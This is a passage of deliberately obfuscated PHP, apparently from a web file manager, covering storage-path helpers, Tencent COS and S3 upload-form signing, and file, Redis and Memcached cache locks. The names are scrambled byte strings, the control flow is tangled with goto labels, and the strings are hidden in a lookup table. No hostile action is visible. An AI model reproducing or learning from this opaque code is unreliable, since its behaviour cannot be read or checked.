} while (strstr($D‰Ó‡†¬±, $d£İ¹‚ƒ‡Ê)) { $D‰Ó‡†¬± = str_replace($d£İ¹‚ƒ‡Ê, $eƒ¬œ†×ĞÆ[8], $D‰Ó‡†¬±); } goto bĞÁèÍ”™à; c®ËÕŞã¾: } public static function sourceID($b¥¨îµ¶í) { $b¾ÜÅãöŞå =& $_SERVER[¦·]; $C˜âƒçÄÆ = self::parse($b¥¨îµ¶í); if ($C˜âƒçÄÆ[$b¾ÜÅãöŞå[29]] !== self::KOD_SOURCE) { show_json(LNG($b¾ÜÅãöŞå[1077]), !1); } return $C˜âƒçÄÆ[$b¾ÜÅãöŞå[367]]; } public static function make($a²Ø¾”Š®) { if (!$a²Ø¾”Š®) { return !1; } return self::makePath(self::KOD_SOURCE, intval($a²Ø¾”Š®)); } public static function makeShare($B‘ºèÖš³‹, $fÉ©¨ÃÉ¼Ã) { return self::makePath(self::KOD_SHARE_ITEM, $B‘ºèÖš³‹, $fÉ©¨ÃÉ¼Ã); } public static function makeFileTypePath($eİƒáÓ®¶) { return self::makePath(self::KOD_USER_FILE_TYPE, $eİƒáÓ®¶); } public static function makeFileTagPath($A˜ˆœ²¢æù) { return self::makePath(self::KOD_USER_FILE_TAG, $A˜ˆœ²¢æù); } public static function makePath($FˆÎ™õğïø, $F…Ğ¹õ—ˆ = '', $bŠÊİÙ˜ì = '') { $CÙõã¼–ĞŞ =& $_SERVER[¦·]; $f½ŸâŒ´³ö = substr($FˆÎ™õğïø, 1, -1); $eµ “…Ëê = $CÙõã¼–ĞŞ[1078] . $f½ŸâŒ´³ö . $CÙõã¼–ĞŞ[1079] . $F…Ğ¹õ—ˆ . $CÙõã¼–ĞŞ[1080]; $eµ “…Ëê = $bŠÊİÙ˜ì ? $eµ “…Ëê . $bŠÊİÙ˜ì . $CÙõã¼–ĞŞ[8] : $eµ “…Ëê; return $eµ “…Ëê; } public static function hashPath($a¨§¾ŠÄŞ¬) { $c­ßºƒ¶Úõ =& $_SERVER[¦·]; $B¡‹ˆµòÎŒ = is_array($a¨§¾ŠÄŞ¬) ? $a¨§¾ŠÄŞ¬ : IO::info($a¨§¾ŠÄŞ¬); $E©ŠƒÅ§× = _get($B¡‹ˆµòÎŒ, $c­ßºƒ¶Úõ[1081], $c­ßºƒ¶Úõ[33]); if (!$E©ŠƒÅ§×) { $DŠè¢ŸÀæ¸ = KodIO::parse($B¡‹ˆµòÎŒ[$c­ßºƒ¶Úõ[75]]); if (!$DŠè¢ŸÀæ¸[$c­ßºƒ¶Úõ[29]]) { $E©ŠƒÅ§× = IO::hashSimple($B¡‹ˆµòÎŒ[$c­ßºƒ¶Úõ[75]]); } } if (!$E©ŠƒÅ§×) { $E©ŠƒÅ§× = md5($B¡‹ˆµòÎŒ[$c­ßºƒ¶Úõ[75]] . $B¡‹ˆµòÎŒ[$c­ßºƒ¶Úõ[77]] . $B¡‹ˆµòÎŒ[$c­ßºƒ¶Úõ[107]]); } return $E©ŠƒÅ§×; } public static function initSystemPath() { $E…¢ôñ›Ğ =& $_SERVER[¦·]; if (defined($E…¢ôñ›Ğ[1082])) { return; } define($E…¢ôñ›Ğ[1082], self::systemPath($E…¢ôñ›Ğ[1083])); define($E…¢ôñ›Ğ[1084], self::systemPath($E…¢ôñ›Ğ[1085])); define($E…¢ôñ›Ğ[1086], self::systemPath($E…¢ôñ›Ğ[1087])); define($E…¢ôñ›Ğ[1088], self::systemPath($E…¢ôñ›Ğ[1089])); } public static function systemPath($F×ì©”‰ĞË) { goto BáÌ˜­Ìè‹; B˜íªä§: return $BÑÀ¦²»‰; goto eÃ„·çÄ¿”; BáÌ˜­Ìè‹: $eèšÇºÌöˆ =& $_SERVER[¦·]; $fš¸î—’„Ä = $eèšÇºÌöˆ[1090] . ucfirst($F×ì©”‰ĞË); $BÑÀ¦²»‰ = Model($eèšÇºÌöˆ[1091])->get($fš¸î—’„Ä); goto a½Ô§ÌÃ; a½Ô§ÌÃ: if ($BÑÀ¦²»‰) { return $BÑÀ¦²»‰; } if ($F×ì©”‰ĞË == $eèšÇºÌöˆ[1083]) { $BÑÀ¦²»‰ = self::make(Model($eèšÇºÌöˆ[753])->systemRootPathAdd($eèšÇºÌöˆ[1092])); } else { $BÑÀ¦²»‰ = self::systemPath($eèšÇºÌöˆ[1083]); $FÃÕ÷¾•’³ = self::sourceID($BÑÀ¦²»‰); $BÑÀ¦²»‰ = self::make(Model($eèšÇºÌöˆ[753])->mkdir($FÃÕ÷¾•’³, $F×ì©”‰ĞË)); } Model($eèšÇºÌöˆ[1091])->set($fš¸î—’„Ä, $BÑÀ¦²»‰); goto B˜íªä§; eÃ„·çÄ¿”: } public static function systemFolder($aĞ¿¯ÙÃ) { $bÏ®Õ×Õœ = IO_PATH_SYSTEM_SOURCE . $aĞ¿¯ÙÃ; $aöÃİ†ã¬ = Cache::get($bÏ®Õ×Õœ); if (!$aöÃİ†ã¬) { $f¦ŸË™´Í› = IO::infoFull($bÏ®Õ×Õœ); if (!$f¦ŸË™´Í›) { $aöÃİ†ã¬ = IO::mkdir($bÏ®Õ×Õœ, REPEAT_SKIP); } else { $aöÃİ†ã¬ = $f¦ŸË™´Í›[$_SERVER[¦·][75]]; } Cache::set($bÏ®Õ×Õœ, $aöÃİ†ã¬, 3600 * 10); } return $aöÃİ†ã¬; } public static function defaultDriver() { return Model($_SERVER[¦·][704])->defaultDriver(); } public static function defaultIO() { $d‚Éåò‡‚Ú =& $_SERVER[¦·]; $c ¨ô¹Â¸ = self::defaultDriver(); return $d‚Éåò‡‚Ú[1093] . $c ¨ô¹Â¸[$d‚Éåò‡‚Ú[367]] . $d‚Éåò‡‚Ú[1080]; } public static function defaultDriverInit() { static $F¼¥‰§Ê³ = false; if ($F¼¥‰§Ê³) { return $F¼¥‰§Ê³; } $F¼¥‰§Ê³ = IO::init(self::defaultIO()); return $F¼¥‰§Ê³; } public static function fileTypeList() { $EÙ–©êº÷ï =& $_SERVER[¦·]; $b“ƒ¤ÑÍ¬‰ = $GLOBALS[$EÙ–©êº÷ï[6]][$EÙ–©êº÷ï[1094]]; foreach ($b“ƒ¤ÑÍ¬‰ as $AŸ‹·¸«ƒ => $a—¤’÷œË¯) { $cÉ†á×·Á = $EÙ–©êº÷ï[1095] . $AŸ‹·¸«ƒ; $bó¦®‰†¶ñ = LNG($cÉ†á×·Á); if ($cÉ†á×·Á != $bó¦®‰†¶ñ) { $b“ƒ¤ÑÍ¬‰[$AŸ‹·¸«ƒ][$EÙ–©êº÷ï[28]] = $bó¦®‰†¶ñ; } } return $b“ƒ¤ÑÍ¬‰; } public static function transferType($bœÇğĞÀ¿í, $f´¸Ì‹™¿Ó) { goto d£›´é©µ‹; c©¼öø™´: if ($C¦‹µßÃ—‡[$bŸçÅ¥Äº[29]] == $cá˜Ï‰Ô‚[$bŸçÅ¥Äº[29]] && $C¦‹µßÃ—‡[$bŸçÅ¥Äº[1096]] == $cá˜Ï‰Ô‚[$bŸçÅ¥Äº[1096]]) { return $bŸçÅ¥Äº[1097]; } if ($C¦‹µßÃ—‡[$bŸçÅ¥Äº[29]] == $bŸçÅ¥Äº[780] && $cá˜Ï‰Ô‚[$bŸçÅ¥Äº[29]] == $bŸçÅ¥Äº[102]) { return $bŸçÅ¥Äº[1043]; } if ($C¦‹µßÃ—‡[$bŸçÅ¥Äº[29]] == $bŸçÅ¥Äº[102] && $cá˜Ï‰Ô‚[$bŸçÅ¥Äº[29]] == $bŸçÅ¥Äº[780]) { return $bŸçÅ¥Äº[103]; } goto FØŒÙ¤²ÀŒ; d£›´é©µ‹: $bŸçÅ¥Äº =& $_SERVER[¦·]; $C¦‹µßÃ—‡ = self::driverType($bœÇğĞÀ¿í); $cá˜Ï‰Ô‚ = self::driverType($f´¸Ì‹™¿Ó); goto c©¼öø™´; FØŒÙ¤²ÀŒ: return $bŸçÅ¥Äº[1098]; goto C‘îëÆíƒ„; C‘îëÆíƒ„: } public static function driverType($fĞà„ÆÈñ“) { goto CºŸ‰ã¹Œ; cÈ¥ñ¯¯«ñ: if ($e­…õ‹¡Ö == $DÀ˜İ™œÌé[695] || $e­…õ‹¡Ö == $DÀ˜İ™œÌé[1100] || $e­…õ‹¡Ö == $DÀ˜İ™œÌé[1101]) { $fĞà„ÆÈñ“ = self::defaultDriverInit(); } else { if ($e­…õ‹¡Ö == $DÀ˜İ™œÌé[1051] || $e­…õ‹¡Ö == $DÀ˜İ™œÌé[1102]) { $fĞà„ÆÈñ“ = IO::init($fĞà„ÆÈñ“->pathParse[$DÀ˜İ™œÌé[1001]]); } } $e­…õ‹¡Ö = str_replace($DÀ˜İ™œÌé[1099], $DÀ˜İ™œÌé[33], strtolower($fĞà„ÆÈñ“->getType())); if ($e­…õ‹¡Ö == $DÀ˜İ™œÌé[102]) { return array($DÀ˜İ™œÌé[29] => $DÀ˜İ™œÌé[102], $DÀ˜İ™œÌé[1096] => $DÀ˜İ™œÌé[33], $DÀ˜İ™œÌé[75] => $fÉ¶Ìâ§êÁ); } goto FÍà‰‚Ùˆ; CºŸ‰ã¹Œ: $DÀ˜İ™œÌé =& $_SERVER[¦·]; $fÉ¶Ìâ§êÁ = $fĞà„ÆÈñ“->path; $e­…õ‹¡Ö = str_replace($DÀ˜İ™œÌé[1099], $DÀ˜İ™œÌé[33], strtolower($fĞà„ÆÈñ“->getType())); goto cÈ¥ñ¯¯«ñ; FÍà‰‚Ùˆ: return array($DÀ˜İ™œÌé[29] => $DÀ˜İ™œÌé[780], $DÀ˜İ™œÌé[1096] => $fĞà„ÆÈñ“->pathDriver, $DÀ˜İ™œÌé[75] => $fÉ¶Ìâ§êÁ); goto C½™æŠÜ¢Õ; C½™æŠÜ¢Õ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($a¦ó‚Üñ»’) { parent::__construct($a¦ó‚Üñ»’); $this->signatureVersion($_SERVER[¦·][200]); } public function uploadFormData($díÏğğÉ›Î, $C¥ÏŸ•¨ö = 3600) { goto eáøß‹¦•Û; C¥Ú«õƒ‹‚: return $AÛä†ÁÒ²; goto f’ÅÃô§Å; eƒæÈØŠ´Ú: $d¯Ë”£‘ò× = array($böˆ³ğ…‚¨[1105] => $fËË¶¡ ùê, $böˆ³ğ…‚¨[1106] => array(array($böˆ³ğ…‚¨[1107] => $bÚ»ˆŠ±ë), array($böˆ³ğ…‚¨[1108] => $this->bucket), array($böˆ³ğ…‚¨[1109], $böˆ³ğ…‚¨[1110], $böˆ³ğ…‚¨[33]), array($böˆ³ğ…‚¨[1111] => $D†ÓËÒ´Ÿ), array($böˆ³ğ…‚¨[1112] => $AÛŞĞ¥«), array($böˆ³ğ…‚¨[1113] => $this->accessKey), array($böˆ³ğ…‚¨[1114] => $bÎˆÆ½¬©ó))); $d¯Ë”£‘ò× = json_encode($d¯Ë”£‘ò×); $eíÏ¾¥ö•Ì = hash_hmac($böˆ³ğ…‚¨[218], $bÎˆÆ½¬©ó, $this->secret); goto b‡»™£ªÀ; eáøß‹¦•Û: $böˆ³ğ…‚¨ =& $_SERVER[¦·]; $bÚ»ˆŠ±ë = $böˆ³ğ…‚¨[185]; $AÛŞĞ¥« = $böˆ³ğ…‚¨[218]; goto CËË—º¸†; b‡»™£ªÀ: $Bºº„éê´ = sha1($d¯Ë”£‘ò×); $FÍªä•È… = hash_hmac($böˆ³ğ…‚¨[218], $Bºº„éê´, $eíÏ¾¥ö•Ì); $AÛä†ÁÒ² = array($böˆ³ğ…‚¨[1107] => $bÚ»ˆŠ±ë, $böˆ³ğ…‚¨[1111] => $D†ÓËÒ´Ÿ, $böˆ³ğ…‚¨[1115] => base64_encode($d¯Ë”£‘ò×), $böˆ³ğ…‚¨[1112] => $AÛŞĞ¥«, $böˆ³ğ…‚¨[1113] => $this->accessKey, $böˆ³ğ…‚¨[1116] => $bÎˆÆ½¬©ó, $böˆ³ğ…‚¨[1117] => $FÍªä•È…, $böˆ³ğ…‚¨[169] => $this->getHost()); goto C¥Ú«õƒ‹‚; CËË—º¸†: $D†ÓËÒ´Ÿ = $böˆ³ğ…‚¨[1103]; $fËË¶¡ ùê = gmdate($böˆ³ğ…‚¨[1104], time() + $C¥ÏŸ•¨ö); $bÎˆÆ½¬©ó = (string) time() . $böˆ³ğ…‚¨[67] . (string) (time() + $C¥ÏŸ•¨ö); goto eƒæÈØŠ´Ú; f’ÅÃô§Å: } public function fileOutLink($dõƒË´¶Ï) { $E¿…ª¨¶¼Å =& $_SERVER[¦·]; if (substr($dõƒË´¶Ï, 0, 7) == $E¿…ª¨¶¼Å[1118]) { $dõƒË´¶Ï = $E¿…ª¨¶¼Å[1119] . substr($dõƒË´¶Ï, 7); } header($E¿…ª¨¶¼Å[156] . $dõƒË´¶Ï); die; } } $c›¥±²Ù¯” = LIB_DIR . $_SERVER[¦·][1120]; goto cºİÁ«‘Ä; bĞâ¤İÆÕù: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c‰ØÚ³ö¤‡; e§âà¾—: if ($a·ŠÌÁİÌß == $a¡•‡íˆ”Ô[17] && $fàíÓ”‘†ë == $a¡•‡íˆ”Ô[9]) { $a·ŠÌÁİÌß = $a¡•‡íˆ”Ô[167]; } switch ($a·ŠÌÁİÌß) { case $a¡•‡íˆ”Ô[758]: self::$handle = new CacheLockRedis(); break; case $a¡•‡íˆ”Ô[759]: self::$handle = new CacheLockMemcached(); break; case $a¡•‡íˆ”Ô[17]: self::$handle = new CacheLockDatabase(); break; case $a¡•‡íˆ”Ô[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto D ÑÂö‰¥»; c‰ØÚ³ö¤‡: $a¡•‡íˆ”Ô =& $_SERVER[¦·]; if (self::$handle) { return self::$handle; } $CîÑ« —¯Ç = $GLOBALS[$a¡•‡íˆ”Ô[6]][$a¡•‡íˆ”Ô[337]]; goto CÖ„‘ÄÈ¤Ë; CÖ„‘ÄÈ¤Ë: self::$timeout = $CîÑ« —¯Ç[$a¡•‡íˆ”Ô[768]] ? $CîÑ« —¯Ç[$a¡•‡íˆ”Ô[768]] : 10; $fàíÓ”‘†ë = _get($GLOBALS[$a¡•‡íˆ”Ô[6]], $a¡•‡íˆ”Ô[769]); $a·ŠÌÁİÌß = $CîÑ« —¯Ç[$a¡•‡íˆ”Ô[755]] ? $CîÑ« —¯Ç[$a¡•‡íˆ”Ô[755]] : $a¡•‡íˆ”Ô[167]; goto e§âà¾—; D ÑÂö‰¥»: } private static function key($B£—ºÜ©İÇ) { return $_SERVER[¦·][770] . Cache::key($B£—ºÜ©İÇ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($eÆŸ¡Ûé×ˆ = '') { self::$errorMsg = $eÆŸ¡Ûé×ˆ; } public static function lockGlobal($F¾‡ãÄíå˜, $E›ÙµáÇÕ‡) { return self::lock($F¾‡ãÄíå˜, $E›ÙµáÇÕ‡, !0); } public static function lock($c„£“¶‘, $cíª°ÚÌÔÄ = false, $bÆÑ¶ïğ“º = false) { goto c‰®ë¬“‰í; F‹ŸöÜèë: $cíª°ÚÌÔÄ = $cíª°ÚÌÔÄ ? $cíª°ÚÌÔÄ : self::$timeout; $B÷Ú”ù¡¶ã = $D¹ß§·¬ê²->lock($E©´³Û”–¼, $cíª°ÚÌÔÄ); if (!$B÷Ú”ù¡¶ã) { $dí«¢Ü™âÑ = $c‡ĞĞ‘Ú„—[771] . $cíª°ÚÌÔÄ . $c‡ĞĞ‘Ú„—[67] . self::$errorMsg . $c‡ĞĞ‘Ú„—[67] . get_caller_msg(); $BíØÛ®Ç¡ƒ = "\114\x6f\x63\153\40\x61\143\x74\151\157\x6e\72\40{$E©´³Û”–¼}\x20\164\151\x6d\x65\157\x75\x74\x2c\x6f\x76\145\162\40{$cíª°ÚÌÔÄ}\x20\163"; $BíØÛ®Ç¡ƒ = self::$errorMsg ? self::$errorMsg : $E›¨Íá‰ñ¢; write_log($dí«¢Ü™âÑ, $c‡ĞĞ‘Ú„—[772]); show_json($BíØÛ®Ç¡ƒ, !1); } goto C»—‹§ºˆÁ; C»—‹§ºˆÁ: if (!$bÆÑ¶ïğ“º) { self::$lockItem[$E©´³Û”–¼] = !0; } return $B÷Ú”ù¡¶ã; goto cåï¦ø‹Òƒ; c‰®ë¬“‰í: $c‡ĞĞ‘Ú„— =& $_SERVER[¦·]; $D¹ß§·¬ê² = self::init(); $E©´³Û”–¼ = self::key($c„£“¶‘); goto F‹ŸöÜèë; cåï¦ø‹Òƒ: } public static function lockGet($c´·¦Ç‘„Å) { $AôŒ„ƒ×ËÛ = self::key($c´·¦Ç‘„Å); if (self::$lockItem[$AôŒ„ƒ×ËÛ]) { return self::$lockItem[$AôŒ„ƒ×ËÛ]; } return self::init()->lockGet($AôŒ„ƒ×ËÛ); } public static function unlock($e“òÓã÷”ñ) { $D§İ˜¢à¨Æ = self::key($e“òÓã÷”ñ); self::$lockItem[$D§İ˜¢à¨Æ] = null; return self::init()->unlock($D§İ˜¢à¨Æ); } public static function unlockRuntime() { $d½ô¸ôÜò =& $_SERVER[¦·]; $D‘×Ó®Ûï± = self::init(); $EõÀî¼Ê = !1; foreach (self::$lockItem as $DÛç³‘²Ï => $B†•çæÒô•) { if (!$B†•çæÒô•) { continue; } $D‘×Ó®Ûï±->unlock($DÛç³‘²Ï); if (!$EõÀî¼Ê) { $EõÀî¼Ê = !0; write_log($d½ô¸ôÜò[773] . $DÛç³‘²Ï . $d½ô¸ôÜò[67] . get_caller_msg(), $d½ô¸ôÜò[772]); continue; } write_log($d½ô¸ôÜò[773] . $DÛç³‘²Ï, $d½ô¸ôÜò[772]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A›ÀÈ¢èõ• =& $_SERVER[¦·]; $fŞ‚§Ãáó® = $GLOBALS[$A›ÀÈ¢èõ•[6]][$A›ÀÈ¢èõ•[337]]; self::$cachePath = $fŞ‚§Ãáó®[$A›ÀÈ¢èõ•[167]][$A›ÀÈ¢èõ•[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d„„‡›…¨, $d‘·ÎĞƒ—Œ = 0) { goto cèŠùµ¦×İ; Bõ ÁÇ• Õ: $this->unlock($d„„‡›…¨); return !1; goto a¾¤Š¬ÜãÄ; cİª’õáä†: $aÙñ˜Ë³õ = rtrim(self::$cachePath, $F‹Ø†ÂÀÀ[8]) . $F‹Ø†ÂÀÀ[774] . md5($d„„‡›…¨) . $F‹Ø†ÂÀÀ[775]; if (file_exists($aÙñ˜Ë³õ) && filemtime($aÙñ˜Ë³õ) && filemtime($aÙñ˜Ë³õ) < time() - 10) { @unlink($aÙñ˜Ë³õ); } do { if (file_exists($aÙñ˜Ë³õ)) { cacheLockWait(); continue; } $CÆÓ”Œİˆñ = fopen($aÙñ˜Ë³õ, $F‹Ø†ÂÀÀ[776]); if (!$CÆÓ”Œİˆñ) { return !1; } $eÙ¸Â¡®±  = flock($CÆÓ”Œİˆñ, LOCK_EX | LOCK_NB); self::$caches[$d„„‡›…¨] = array($F‹Ø†ÂÀÀ[777] => $CÆÓ”Œİˆñ, $F‹Ø†ÂÀÀ[167] => $aÙñ˜Ë³õ); fwrite($CÆÓ”Œİˆñ, $c»Óé¥îœ); clearstatcache(); if ($CÆÓ”Œİˆñ && $eÙ¸Â¡®± ) { return !0; } cacheLockWait(); } while (microtime(!0) < $c»Óé¥îœ); goto Bõ ÁÇ• Õ; cèŠùµ¦×İ: $F‹Ø†ÂÀÀ =& $_SERVER[¦·]; $e‡ô•¾ãÌ = microtime(!0); $c»Óé¥îœ = $e‡ô•¾ãÌ + $d‘·ÎĞƒ—Œ + 0.0001; goto cİª’õáä†; a¾¤Š¬ÜãÄ: } public function lockGet($a¢ Ê¾½ó) { $A÷ŒÇ‡Ú„Ê =& $_SERVER[¦·]; $f–¶ö–¢ËÛ = rtrim(self::$cachePath, $A÷ŒÇ‡Ú„Ê[8]) . $A÷ŒÇ‡Ú„Ê[774] . md5($a¢ Ê¾½ó) . $A÷ŒÇ‡Ú„Ê[775]; return file_exists($f–¶ö–¢ËÛ); } public function unlock($E–œÑÓ©¯Ò) { goto e„ó•—ŠœÆ; e„ó•—ŠœÆ: $AµÄ„ÊÁÀ =& $_SERVER[¦·]; $fÅ¬‚Ã­š‘ = self::$caches[$E–œÑÓ©¯Ò]; if (!$fÅ¬‚Ã­š‘) { return; } goto d§Ü„’ß; bç×çÍ’ç¥: unset(self::$caches[$E–œÑÓ©¯Ò]); goto CùƒÒ‘ñ¦·; d§Ü„’ß: @flock($fÅ¬‚Ã­š‘[$AµÄ„ÊÁÀ[777]], LOCK_UN); @fclose($fÅ¬‚Ã­š‘[$AµÄ„ÊÁÀ[777]]); @unlink($fÅ¬‚Ã­š‘[$AµÄ„ÊÁÀ[167]]); goto bç×çÍ’ç¥; CùƒÒ‘ñ¦·: } } goto AÑÅØß¾³‘; FğÍŠ”âÂ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bîã†Ï½Éâ) { parent::__construct($bîã†Ï½Éâ); } public function uploadFormData($A…¿ô„Ö¤Ô, $bÍóç¬ãôæ = 3600) { goto Bã‚ª¨¶¿í; CğÀÇÅÑºƒ: $C—¨–¿¢ˆƒ = hash_hmac($bê¡Ùï¨¯[1149], $d‚ÎØƒÆæÊ, $cÊùÃ–‹Š¸, !0); $C¤´¤Ô…ç¤ = hash_hmac($bê¡Ùï¨¯[1149], $fˆÓËÜ›ì, $C—¨–¿¢ˆƒ, !0); $aÄ¬ƒ„Šˆ’ = hash_hmac($bê¡Ùï¨¯[1149], $fÑß«É¸æå, $C¤´¤Ô…ç¤); goto dËĞ–É·Êë; Eìâ†‚ÛÚ: $fˆÓËÜ›ì = $bê¡Ùï¨¯[1141]; $D ¬«ô‹ ¶ = $bÍóç¬ãôæ . $bê¡Ùï¨¯[33]; $FÉê¢Õï¼Ñ = $bê¡Ùï¨¯[1103]; goto AŠàª‚ÎÂŒ; Bã‚ª¨¶¿í: $bê¡Ùï¨¯ =& $_SERVER[¦·]; $Cç·‘©è‰Œ = $bê¡Ùï¨¯[185]; $eÉäëêÏ = $bê¡Ùï¨¯[1139]; goto añÜ…·ÍÄ; añÜ…·ÍÄ: $d‚ÎØƒÆæÊ = $bê¡Ùï¨¯[59]; $b‰Ê¯İİ‹é = gmdate($bê¡Ùï¨¯[1140]); $bí„¹ì°Ùå = gmdate($bê¡Ùï¨¯[691]); goto Eìâ†‚ÛÚ; EãœÕ¿‘: $fÑß«É¸æå = base64_encode(json_encode($c²®¢‹§ÀÁ)); $Eë ÃÔ³à = hash_hmac($bê¡Ùï¨¯[1149], $bí„¹ì°Ùå, $bê¡Ùï¨¯[1150] . $this->secret, !0); $cÊùÃ–‹Š¸ = hash_hmac($bê¡Ùï¨¯[1149], $this->region, $Eë ÃÔ³à, !0); goto CğÀÇÅÑºƒ; AŠàª‚ÎÂŒ: $A©³¦÷‹•¸ = array($this->accessKey, $bí„¹ì°Ùå, $this->region, $d‚ÎØƒÆæÊ, $fˆÓËÜ›ì); $d¼ Ÿ…¹· = implode($bê¡Ùï¨¯[8], $A©³¦÷‹•¸); $c²®¢‹§ÀÁ = array($bê¡Ùï¨¯[1105] => gmdate($bê¡Ùï¨¯[1104], strtotime($bê¡Ùï¨¯[1142])), $bê¡Ùï¨¯[1106] => array(array($bê¡Ùï¨¯[1108] => $this->bucket), array($bê¡Ùï¨¯[1107] => $Cç·‘©è‰Œ), array($bê¡Ùï¨¯[1109], $bê¡Ùï¨¯[1110], $bê¡Ùï¨¯[33]), array($bê¡Ùï¨¯[1109], $bê¡Ùï¨¯[1143], $bê¡Ùï¨¯[33]), array($bê¡Ùï¨¯[1109], $bê¡Ùï¨¯[1144], $bê¡Ùï¨¯[33]), array($bê¡Ùï¨¯[1111] => $FÉê¢Õï¼Ñ), array($bê¡Ùï¨¯[1145] => $d¼ Ÿ…¹·), array($bê¡Ùï¨¯[1146] => $eÉäëêÏ), array($bê¡Ùï¨¯[1147] => $b‰Ê¯İİ‹é), array($bê¡Ùï¨¯[1148] => $D ¬«ô‹ ¶))); goto EãœÕ¿‘; dËĞ–É·Êë: $c‡œİ‘İæ± = array($bê¡Ùï¨¯[199] => $bê¡Ùï¨¯[33], $bê¡Ùï¨¯[1151] => $bê¡Ùï¨¯[33], $bê¡Ùï¨¯[1107] => $Cç·‘©è‰Œ, $bê¡Ùï¨¯[1111] => $FÉê¢Õï¼Ñ, $bê¡Ùï¨¯[1115] => $fÑß«É¸æå, $bê¡Ùï¨¯[1152] => $d¼ Ÿ…¹·, $bê¡Ùï¨¯[1153] => $eÉäëêÏ, $bê¡Ùï¨¯[1154] => $b‰Ê¯İİ‹é, $bê¡Ùï¨¯[1155] => $D ¬«ô‹ ¶, $bê¡Ùï¨¯[1156] => $aÄ¬ƒ„Šˆ’, $bê¡Ùï¨¯[169] => $this->getHost()); return $c‡œİ‘İæ±; goto D‚ÆƒÀËù; D‚ÆƒÀËù: } public function multiUploadFormData($FóÆ¾ÑÏ‘, $B”Šºøíî = 3600) { $BßñËÅ¯‹» =& $_SERVER[¦·]; $dÌåŸµ­  = gmdate($BßñËÅ¯‹»[1235]); $F—¬™Ù¹ØÙ = array(); $F”×²¨Ù‹Œ = $this->client->getUploadId($this->bucket, $FóÆ¾ÑÏ‘, $F—¬™Ù¹ØÙ); if (!$F”×²¨Ù‹Œ) { return !1; } return array($BßñËÅ¯‹»[209] => $F”×²¨Ù‹Œ, $BßñËÅ¯‹»[169] => $this->getHost() . $BßñËÅ¯‹»[8] . $this->pathEncode($FóÆ¾ÑÏ‘), $BßñËÅ¯‹»[210] => $dÌåŸµ­ , $BßñËÅ¯‹»[89] => $FóÆ¾ÑÏ‘); } public function multiUploadAuthData($fˆâ«ÈÎˆº, $Cí‰Õ¸…‘ä = array()) { goto d†±¸„àÍÎ; d†±¸„àÍÎ: $a²ï²“¾ =& $_SERVER[¦·]; $B‰ç™«Ñ´Å = isset($Cí‰Õ¸…‘ä[$a²ï²“¾[160]]) ? $Cí‰Õ¸…‘ä[$a²ï²“¾[160]] : $a²ï²“¾[33]; $A²²šòÒ¼‰ = $Cí‰Õ¸…‘ä[$a²ï²“¾[89]]; goto e®ìÕª§ò±; b£àÖ¹Ô›å: if (strpos($B‰ç™«Ñ´Å, $a²ï²“¾[213]) === 0) { if (isset($DÈš£Ô½[$a²ï²“¾[1237]])) { $e½›¯’È¦ = $DÈš£Ô½[$a²ï²“¾[1237]]; } else { if (isset($CÕœš±×¹ò[$a²ï²“¾[1237]])) { $e½›¯’È¦ = $CÕœš±×¹ò[$a²ï²“¾[1237]]; } else { $e½›¯’È¦ = hash($a²ï²“¾[1149], $a²ï²“¾[33]); } } return array($a²ï²“¾[220] => $CÕœš±×¹ò[$a²ï²“¾[220]], $a²ï²“¾[1237] => $e½›¯’È¦, $a²ï²“¾[210] => $CÕœš±×¹ò[$a²ï²“¾[1240]]); } return $CÕœš±×¹ò[$a²ï²“¾[220]]; goto b§²í˜ƒáÄ; c–ÆÌÆæÛ: $CëñÒ  = $a²ï²“¾[214]; $dô¹›ÍÏë = $a²ï²“¾[8] . $this->pathEncode($A²²šòÒ¼‰) . $B‰ç™«Ñ´Å; $CÕœš±×¹ò = $this->client->__getSignatureV4($DÈš£Ô½, $a„ô›•‰±–, $CëñÒ , $dô¹›ÍÏë); goto b£àÖ¹Ô›å; eŞ¡¾ĞÒ”ò: if (isset($Cí‰Õ¸…‘ä[$a²ï²“¾[1236]])) { $DÈš£Ô½[$a²ï²“¾[1237]] = $Cí‰Õ¸…‘ä[$a²ï²“¾[1236]]; } $b§ëÕ‰—Ù = explode($a²ï²“¾[171], $this->getHost()); $a„ô›•‰±– = array($a²ï²“¾[1238] => $b§ëÕ‰—Ù[1], $a²ï²“¾[1239] => $a²ï²“¾[33], $a²ï²“¾[199] => $a²ï²“¾[116], $a²ï²“¾[1151] => $Cí‰Õ¸…‘ä[$a²ï²“¾[77]]); goto c–ÆÌÆæÛ; e®ìÕª§ò±: unset($Cí‰Õ¸…‘ä[$a²ï²“¾[89]]); if (isset($Cí‰Õ¸…‘ä[$a²ï²“¾[211]])) { return $this->listUploadParts($A²²šòÒ¼‰, $Cí‰Õ¸…‘ä); } $DÈš£Ô½ = array(); goto eŞ¡¾ĞÒ”ò; b§²í˜ƒáÄ: } public function listUploadParts($c„†õ–„ÖŒ, $Fğá…ãÙØ¸ = array()) { goto FÉ¥¿´Šæˆ; FÉ¥¿´Šæˆ: $cÂ¹˜¾‹ç‰ =& $_SERVER[¦·]; $E—¾Î£¹ƒ = str_replace($cÂ¹˜¾‹ç‰[221], $cÂ¹˜¾‹ç‰[33], $Fğá…ãÙØ¸[$cÂ¹˜¾‹ç‰[160]]); $d¸¸¥çÈ = $this->client->listParts($this->bucket, $c„†õ–„ÖŒ, $E—¾Î£¹ƒ); goto D—Óµµ‘™; FÉÎˆÔÕÚ“: $fÈêÖåÄ¤„ = $this->client->__getSignatureV4($aãàŠ´®Ğ–, $eÄ–·‘ÒçÚ, $cŠÆñ¼Õ˜Ì, $Bæ„Œ–‘‚Š, $eì°à±õ‘Ç); return array($cÂ¹˜¾‹ç‰[220] => $fÈêÖåÄ¤„[$cÂ¹˜¾‹ç‰[220]], $cÂ¹˜¾‹ç‰[210] => $fÈêÖåÄ¤„[$cÂ¹˜¾‹ç‰[1240]], $cÂ¹˜¾‹ç‰[222] => $d¸¸¥çÈ, $cÂ¹˜¾‹ç‰[1237] => $fÈêÖåÄ¤„[$cÂ¹˜¾‹ç‰[1237]]); goto D›Ô„ĞÈã…; dœå°Şğá«: $eÄ–·‘ÒçÚ = 